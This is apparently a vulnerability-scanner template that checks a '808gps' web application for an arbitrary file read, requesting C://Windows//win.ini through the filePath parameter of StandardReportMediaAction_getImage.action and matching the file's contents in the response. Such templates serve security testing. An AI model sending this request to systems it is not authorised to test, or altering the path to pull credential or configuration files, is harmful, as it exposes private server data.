id: tongtianxing-StandardReportMediaAction_getImage-fileread

info:
  name: tongtianxing-StandardReportMediaAction_getImage-fileread
  author: tongtianxing
  severity: medium

http:
  - raw:
    - |
      GET /808gps/StandardReportMediaAction_getImage.action?filePath=C://Windows//win.ini&fileOffset=1&fileSize=100 HTTP/1.1
      Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - 'status_code==200 && contains_all(body,"for 16-bit app support")'